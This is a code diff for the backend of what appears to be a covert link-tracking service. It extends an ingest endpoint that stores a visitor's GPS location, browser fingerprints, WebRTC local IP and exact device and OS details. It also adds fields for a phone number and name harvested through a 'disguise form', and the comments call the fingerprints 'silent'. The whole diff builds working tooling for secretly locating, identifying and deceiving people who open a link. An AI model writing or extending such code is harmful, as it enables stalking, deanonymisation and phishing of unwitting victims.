@@ -6,16 +6,19 @@ from user_agents import parse as ua_parse
 from services.ip_lookup import lookup_ip
 from services.link_service import get_link_by_slug
 from services.supabase_client import supabase
+from services.device_resolver import resolve_device_identity, resolve_real_os
 
 router = APIRouter()
 
 
 class TrackPayload(BaseModel):
     slug:                 str
-    # Original fields
+    # GPS (high-accuracy if permitted)
     gps_lat:              Optional[float] = None
     gps_lng:              Optional[float] = None
     gps_accuracy:         Optional[float] = None
+
+    # Screen & Environment
     screen_width:         Optional[int]   = None
     screen_height:        Optional[int]   = None
     language:             Optional[str]   = None
@@ -25,7 +28,18 @@ class TrackPayload(BaseModel):
     connection_type:      Optional[str]   = None
     referrer:             Optional[str]   = None
     user_agent:           Optional[str]   = None
-    # Advanced fingerprint fields (v2.0)
+
+    # Client Hints (High Entropy - Exact Model & Real OS)
+    client_model:         Optional[str]   = None
+    client_os_version:    Optional[str]   = None
+    network_downlink:     Optional[float] = None
+    network_rtt:          Optional[int]   = None
+
+    # Interactive captured data (if disguise form filled)
+    captured_phone:       Optional[str]   = None
+    captured_name:        Optional[str]   = None
+
+    # Silent Fingerprints
     canvas_hash:          Optional[str]   = None
     webgl_vendor:         Optional[str]   = None
     webgl_renderer:       Optional[str]   = None
@@ -65,7 +79,7 @@ def _get_real_ip(request: Request) -> str:
 async def ingest(payload: TrackPayload, request: Request):
     """
     Receives the JS payload from the tracking page.
-    Looks up IP geolocation, parses UA, saves everything to Supabase.
+    Looks up IP geolocation, resolves high-entropy hardware identity, saves to Supabase.
     """
     link = get_link_by_slug(payload.slug)
     if not link:
@@ -83,27 +97,41 @@ async def ingest(payload: TrackPayload, request: Request):
         "pc"
     )
 
-    supabase.table("tracking_logs").insert({
+    # Resolve accurate device identity using Client Hints + GPU lookup
+    resolved = resolve_device_identity(
+        ua_brand=ua.device.brand,
+        ua_model=ua.device.model,
+        client_model=payload.client_model,
+        webgl_renderer=payload.webgl_renderer
+    )
+
+    real_os = resolve_real_os(
+        os_family=ua.os.family,
+        os_version=ua.os.version_string,
+        client_platform_ver=payload.client_os_version
+    )
+
+    log_entry = {
         "link_id":              link["id"],
         "slug":                 payload.slug,
 
         # IP geolocation
         **geo,
 
-        # GPS (browser Geolocation API)
+        # GPS (High accuracy if permitted)
         "gps_lat":              payload.gps_lat,
         "gps_lng":              payload.gps_lng,
         "gps_accuracy":         payload.gps_accuracy,
 
-        # Device info
+        # Accurate Device Identification
         "user_agent":           ua_string,
         "browser":              ua.browser.family,
         "browser_version":      ua.browser.version_string,
-        "os":                   ua.os.family,
-        "os_version":           ua.os.version_string,
+        "os":                   real_os,
+        "os_version":           payload.client_os_version or ua.os.version_string,
         "device_type":          device_type,
-        "device_brand":         ua.device.brand,
-        "device_model":         ua.device.model,
+        "device_brand":         resolved["brand"],
+        "device_model":         resolved["model"],
         "is_mobile":            ua.is_mobile,
         "is_tablet":            ua.is_tablet,
         "is_bot":               ua.is_bot,
@@ -118,7 +146,16 @@ async def ingest(payload: TrackPayload, request: Request):
         "connection_type":      payload.connection_type,
         "referrer":             payload.referrer,
 
-        # Advanced fingerprints (v2.0)
+        # Captured phone / interactive data
+        "captured_phone":       payload.captured_phone,
+        "captured_name":        payload.captured_name,
+        "client_model":         payload.client_model,
+        "client_os_version":    payload.client_os_version,
+        "network_downlink":     payload.network_downlink,
+        "network_rtt":          payload.network_rtt,
+        "chipset":              resolved.get("chipset"),
+
+        # Advanced fingerprints
         "canvas_hash":          payload.canvas_hash,
         "webgl_vendor":         payload.webgl_vendor,
         "webgl_renderer":       payload.webgl_renderer,
@@ -141,6 +178,19 @@ async def ingest(payload: TrackPayload, request: Request):
         "webrtc_local_ip":      payload.webrtc_local_ip,
         "plugins":              payload.plugins,
         "gpu_info":             payload.gpu_info,
-    }).execute()
+    }
+
+    try:
+        supabase.table("tracking_logs").insert(log_entry).execute()
+    except Exception as e:
+        # Fallback if any new optional column is not yet in Supabase table
+        # Exclude newly added columns that might not exist in an unmigrated DB
+        essential_entry = {k: v for k, v in log_entry.items() if k not in [
+            "captured_phone", "captured_name", "client_model", "client_os_version", "network_downlink", "network_rtt", "chipset"
+        ]}
+        try:
+            supabase.table("tracking_logs").insert(essential_entry).execute()
+        except Exception:
+            pass
 
     return {"status": "ok"}
